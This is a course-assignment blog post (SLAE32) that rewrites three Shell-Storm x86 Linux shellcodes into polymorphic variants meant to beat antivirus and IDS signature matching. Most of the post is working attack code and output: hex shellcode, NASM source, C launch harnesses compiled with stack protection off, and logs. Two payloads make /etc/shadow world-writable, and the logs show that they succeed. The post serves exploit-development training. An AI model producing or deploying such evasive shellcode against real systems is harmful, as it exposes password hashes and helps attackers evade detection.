---
title: "SLAE32 - Assignment #6 - Polymorphic Shellcodes"
tags: ["slae32", "assembly", "shellcode", "exploit-development"]
---

## Introduction

This is the blog post for the 6<sup>th</sup> Assignment of the SLAE32 course, which is offered by <a href="https://www.pentesteracademy.com/course?id=3" target="_blank">PentesterAcademy</a>. The course focuses on teaching the basics of 32-bit Assembly language for the Intel Architecture (IA-32) family of processors on the Linux platform.

The purpose of this assignment is to take 3 shellcodes from <a href="https://shell-storm.org/shellcode/index.html" target="_blank">Shell-Storm</a> from the **Intel x86** category and create polymorphic versions of them in order to beat pattern matching. Pattern matching means that a program (AV or IDS) has a database with **signatures**. A signature is bytes suite identifying a program. More information can be found at: <a href="https://phrack.org/issues/61/9.html" target="_blank">Polymorphic Shellcode Engine, by Phrack</a>. So, with polymorphism we preserve the functionality of the shellcode, by using equivalent instructions or garbage instructions that don't change the functionality at all, like `NOP`. 

The table below is used to navigate to each original and polymorphic shellcode and provides the size of the shellcode before and after the modifications.

| Shellcode Name | Shellcode in Shell-Storm | Original Size | Polymorphic Size |
| -- | -- | -- | -- |
| [chmod](#chmod) | <a href="https://shell-storm.org/shellcode/files/shellcode-590.html" target="_blank">Shell-Storm chmod</a> | 33 | 43 |
| [execve-chmod](#execve-chmod) | <a href="https://shell-storm.org/shellcode/files/shellcode-828.html" target="_blank">Shell-Storm execve-chmod</a> | 57 | 80 |
| [sys_exit(0)](#sys_exit) | <a href="https://shell-storm.org/shellcode/files/shellcode-623.html" target="_blank">Shell-Storm sys_exit(0) x86 linux shellcode</a> | 8 | 7 |

My code can be found in my Github: <a href="https://github.com/geobour98/slae32" target="_blank">geobour98's Github</a>.

## chmod {#chmod}

The original `chmod("/etc/shadow, 0777")` shellcode is the following:

```shell
\x31\xc0\x50\xb0\x0f\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x89\xe3\x31\xc9\x66\xb9\xff\x01\xcd\x80\x40\xcd\x80
```

The initial `Assembly` version (`chmod-original.nasm`) would look like this:

```nasm
global _start

section .text
_start:

	xor eax, eax
	push eax

	mov al, 0xf

	push 0x776f6461
	push 0x68732f63
	push 0x74652f2f

	mov ebx, esp

	xor ecx, ecx

	mov cx, 0x1ff

	int 0x80

	inc eax

	int 0x80
```

Briefly, 2 syscalls are executed, indicated by the 2 times of the instruction: `int 0x80`. The first syscall is `chmod` and its number `15` is passed to `EAX`. Then the string "//etc/shadow" is pushed to the stack and then saved to `EBX` register. After that, the hex value `0x1ff` (`777` in octal) is passed to `ECX` register. The `chmod` syscall is now executed. If the execution of `chmod` is successful, `0` is returned and saved in `EAX`. The value of `EAX` is incremented by `1`, so it becomes `1`, which is the value of the `exit` syscall. Finally, the `exit` syscall is executed.

The polymorphic version (`chmod.nasm`) is the following:

```nasm
global _start

section .text
_start:

	xor eax, eax		; clear eax

	push eax		; push the value 0 to the stack
	
	mov al, 0xf		; f is the hex value of the decimal 15 for chmod syscall

	; push 0x776f6461
	mov dword [esp-4], 0x776f6461 	; "adow" is saved to the stack

	; push 0x68732f63
	mov dword [esp-8], 0x68732f63	; "c/sh" is saved to the stack

	; push 0x74652f2f
	mov dword [esp-12], 0x74652f2f	; "//et" is saved to the stack

	sub esp, 12		; esp points at the top of the stack, where is th string "//etc/shadow"

	mov ebx, esp		; ebx now points at the string at the top of the stack

	mov cx, 0x1ff		; 1ff is the hex value for the octal 777 (permissions)

	int 0x80		; exec chmod syscall
	
	inc eax			; increment eax to 1

	int 0x80		; exec exit syscall
```

The comments are self-explanatory for the functionality of this program, which is the same as the original.

Now the changes, that were made in the polymorphic version, are explained. The addresses that hold the string "//etc/shadow" aren't directly pushed on the stack, but they are saved in locations pointed by `EBX` with `mov` instructions. Also, the clear of the `ECX` register wasn't necessary, so that instruction is removed.

### Testing the chmod polymorphic shellcode

Now we need to compile `chmod.nasm` with the bash script `compile.sh` and extract the shellcode from the generated executable with the `objdump` one-liner.

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/6_Polymorphic_shellcodes/1_chmod$ ./compile.sh chmod
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
```

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/6_Polymorphic_shellcodes/1_chmod$ objdump -d ./chmod | grep '[0-9a-f]:' | grep -v 'file'|cut -f2 -d: | cut -f1-7 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
"\x31\xc0\x50\xb0\x0f\xc7\x44\x24\xfc\x61\x64\x6f\x77\xc7\x44\x24\xf8\x63\x2f\x73\x68\xc7\x44\x24\xf4\x2f\x2f\x65\x74\x83\xec\x0c\x89\xe3\x66\xb9\xff\x01\xcd\x80\x40\xcd\x80"
```

After that, we modify the `shellcode.c` with the shellcode from `objdump`, which checks if a shellcode is working.

The whole `C` program is the following:

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = 
"\x31\xc0\x50\xb0\x0f\xc7\x44\x24\xfc\x61\x64\x6f\x77\xc7\x44\x24\xf8\x63\x2f\x73\x68\xc7\x44\x24\xf4\x2f\x2f\x65\x74\x83\xec\x0c\x89\xe3\x66\xb9\xff\x01\xcd\x80\x40\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();
}
```

Now we need to compile the `C` program, by disabling the stack protection as well as making the stack executable:

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/6_Polymorphic_shellcodes/1_chmod$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

In order to verify that the payload is working we must execute `shellcode`. We also check the permissions of `/etc/shadow` before and after the execution.

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/6_Polymorphic_shellcodes/1_chmod$ ls -la /etc/shadow
-rw-r----- 1 root shadow 1298 Απρ  02 20:04 /etc/shadow
geobour98@slae32-dev:~/SLAE/custom/SLAE32/6_Polymorphic_shellcodes/1_chmod$ sudo ./shellcode
Shellcode Length:  43
geobour98@slae32-dev:~/SLAE/custom/SLAE32/6_Polymorphic_shellcodes/1_chmod$ ls -la /etc/shadow
-rwxrwxrwx 1 root shadow 1298 Απρ  02 20:04 /etc/shadow
```

The shellcode is working and its size is `43` bytes!

## execve-chmod {#execve-chmod}

The original `execve-chmod 0777 /etc/shadow` shellcode is the following:

```shell
\x31\xc0\x50\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe6\x50\x68\x30\x37\x37\x37\x89\xe5\x50\x68\x68\x6d\x6f\x64\x68\x69\x6e\x2f\x63\x66\x68\x2f\x62\x89\xe3\x50\x56\x55\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80
``` 

The initial `Assembly` version (`execve-chmod-original.nasm`) would look like this:

```nasm
global _start

section .text
_start:

	xor eax, eax
	push eax

	push 0x776f6461
	push 0x68732f2f
	push 0x6374652f

	mov esi, esp

	push eax

	push 0x37373730

	mov ebp, esp

	push eax

	push  0x646f6d68
	push  0x632f6e69
	push  0x622f2f2f

	mov ebx, esp

	push eax
	push esi
	push ebp
	push ebx

	mov ecx, esp
	
	mov edx, eax

	mov al, 0xb

	int 0x80
```

Briefly, the syscall that is executed is `execve`, because of the number `11` passed to `EAX`. The string "///bin/chmod" is pushed to the stack and then saved to `EBX` register. Then, the string "/etc//shadow" is pushed to the stack and later saved to `ESI` register. After that, the string "0777" is pushed to the stack and saved to `EBP` register. So, the arguments of the `execve` can be matched with their values in the following table.

| Argument | Value |
| -- | -- |
| `filename` | `///bin/chmod` |
| `argv` | `/etc//shadow` |
| `envp` | `0777` |

The polymorphic version (`execve-chmod.nasm`) is the following:

```nasm
global _start

section .text
_start:

	xor eax, eax		; clear eax
	
	push eax		; push the value 0 to the stack
	
	; push 0x776f6461
	mov dword [esp-4], 0x776f6461	; "adow" is saved to the stack

	; push 0x68732f2f
	mov dword [esp-8], 0x68732f2f	; "//sh" is saved to the stack

	; push 0x6374652f
	mov dword [esp-12], 0x6374652f	; "/etc" is saved to the stack

	sub esp, 12		; esp points at the top of the stack, where is th string "/etc//shadow"

	mov esi, esp		; esi now points at the string at the top of the stack

	push eax		; push the value 0 to the stack
	
	push 0x37373730		; push "0777" (permissions) to the stack
	mov ebp, esp		; ebp now points at the string at the top of the stack, where is the string "0777"

	push eax			; push the value 0 to the stack

	; push  0x646f6d68
	mov dword [esp-4], 0x646f6d68	; "hmod" is saved to the stack
	
	; push  0x632f6e69
	mov dword [esp-8], 0x632f6e69	; "in/c" is saved to the stack
	
	; push  0x622f2f2f
	mov dword [esp-12], 0x622f2f2f	; "///b" is saved to the stack

	sub esp, 12			; esp points at the top of the stack, where is th string "///bin/chmod"

	mov ebx, esp			; ebx now points at the string at the top of the stack 

	push eax			; push the value 0 to the stack
	push esi			; push "/etc//shadow"
	push ebp			; push "0777"
	push ebx			; push "///bin/chmod"

	mov ecx, esp			; ecx points at the top of the stack
	
	mov al, 0xb			; b is the hex value of the decimal 11 for execve syscall 

	int 0x80			; exec execve syscall
```

The comments are self-explanatory for the functionality of this program, which is the same as the original.

Now the changes, that were made in the polymorphic version, are explained. The addresses that hold the string "/etc//shadow" aren’t directly pushed on the stack, but they are saved in locations pointed by `ESI` with `mov` instructions. Also, the addresses that hold the string "///bin/chmod" aren't directly pushed on the stack, but they are saved in locations pointed by `EBX`. The clear of the `EDX` register wasn't necessary, so that instruction is removed.

### Testing the execve-chmod polymorphic shellcode

Now we need to compile `execve-chmod.nasm` with the bash script `compile.sh` and extract the shellcode from the generated executable with `objdump` one-liner.

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/6_Polymorphic_shellcodes/2_execve_chmod$ ./compile.sh execve-chmod
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
```

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/6_Polymorphic_shellcodes/2_execve_chmod$ objdump -d ./execve-chmod | grep '[0-9a-f]:' | grep -v 'file'|cut -f2 -d: | cut -f1-7 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
"\x31\xc0\x50\xc7\x44\x24\xfc\x61\x64\x6f\x77\xc7\x44\x24\xf8\x2f\x2f\x73\x68\xc7\x44\x24\xf4\x2f\x65\x74\x63\x83\xec\x0c\x89\xe6\x50\x68\x30\x37\x37\x37\x89\xe5\x50\xc7\x44\x24\xfc\x68\x6d\x6f\x64\xc7\x44\x24\xf8\x69\x6e\x2f\x63\xc7\x44\x24\xf4\x2f\x2f\x2f\x62\x83\xec\x0c\x89\xe3\x50\x56\x55\x53\x89\xe1\xb0\x0b\xcd\x80"
```

After that, we modify the `shellcode.c` with the shellcode from `objdump`.

The whole `C` program is the following:

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = 
"\x31\xc0\x50\xc7\x44\x24\xfc\x61\x64\x6f\x77\xc7\x44\x24\xf8\x2f\x2f\x73\x68\xc7\x44\x24\xf4\x2f\x65\x74\x63\x83\xec\x0c\x89\xe6\x50\x68\x30\x37\x37\x37\x89\xe5\x50\xc7\x44\x24\xfc\x68\x6d\x6f\x64\xc7\x44\x24\xf8\x69\x6e\x2f\x63\xc7\x44\x24\xf4\x2f\x2f\x2f\x62\x83\xec\x0c\x89\xe3\x50\x56\x55\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();
}
```

Now we compile the `C` program.

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/6_Polymorphic_shellcodes/2_execve_chmod$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

In order to verify that the payload is working we must execute `shellcode`. We also check the permissions of `/etc/shadow` before and after the execution.

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/6_Polymorphic_shellcodes/2_execve_chmod$ ls -la /etc/shadow
-rw-r----- 1 root shadow 1298 Απρ  03 20:04 /etc/shadow
geobour98@slae32-dev:~/SLAE/custom/SLAE32/6_Polymorphic_shellcodes/2_execve_chmod$ sudo ./shellcode
Shellcode Length:  80
geobour98@slae32-dev:~/SLAE/custom/SLAE32/6_Polymorphic_shellcodes/2_execve_chmod$ ls -la /etc/shadow
-rwxrwxrwx 1 root shadow 1298 Απρ  03 20:04 /etc/shadow
```

## sys_exit(0) {#sys_exit}

The original `sys_exit(0) x86 linux shellcode` shellcode is the following:

```shell
\x31\xc0\xb0\x01\x31\xdb\xcd\x80
```

The initial `Assembly` version (`sys-exit-original.nasm`) would look like this:

```nasm
global _start

section .text
_start:

	xor eax, eax
	
	mov al, 0x1

	xor ebx, ebx

	int 0x80
```

Briefly, the syscall that is executed is `exit`, because of the number `1` passed to `EAX`. `exit` terminates the calling proocess. It needs the argument `status` to be set and in our case is `0`, so this value is saved to `EBX`. 

The polymorphic version (`sys-exit.nasm`) is the following:

```nasm
global _start

section .text
_start:

	xor eax, eax	; clear eax
	
	inc eax		; increment eax to 1

	xor ebx, ebx	; clear ebx

	int 0x80	; exec exit syscall
```

The comments are self-explanatory for the functionality of this program, which is the same as the original.

Now the change, that was made in the polymorphic version, is explained. Instead of saving the value `1` at `EAX` with the `mov` instruction, we increment the value of `EAX` to `1`, since after the clear of the register it has value `0`. This way the length of the shellcode is 1 byte less than the original one!

### Testing the sys_exit(0) polymorphic shellcode

Now we need to compile `sys-exit.nasm` with the bash script `compile.sh` and extract the shellcode from the generated executable with `objdump` one-liner.

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/6_Polymorphic_shellcodes/3_sys_exit$ ./compile.sh sys-exit
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
```

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/6_Polymorphic_shellcodes/3_sys_exit$ objdump -d ./sys-exit | grep '[0-9a-f]:' | grep -v 'file'|cut -f2 -d: | cut -f1-7 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'"\x31\xc0\x40\x31\xdb\xcd\x80"
```

After that, we modify the `shellcode.c` with the shellcode from `objdump`.

The whole `C` program is the following:

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = 
"\x31\xc0\x40\x31\xdb\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();
}
```

Now we compile the `C` program.

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/6_Polymorphic_shellcodes/3_sys_exit$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

In order to verify that the payload is working we must execute `shellcode`.

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/6_Polymorphic_shellcodes/3_sys_exit$ ./shellcode
Shellcode Length:  7
```

We managed to decrease the size of the shellcode by 1 byte!

## Summary

The polymorphic versions of the shellcodes: `chmod`, `execve-chmod` and `sys_exit(0)` are succesfully created and working as the original ones. 

Next will be the custom crypter!

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> **SLAE32 Blog Post**
>
> This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
> 
> https://www.pentesteracademy.com/course?id=3
>
> ~~http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/~~
>
> **Student ID: PA-36167**
{: .prompt-info }
<!-- markdownlint-restore -->
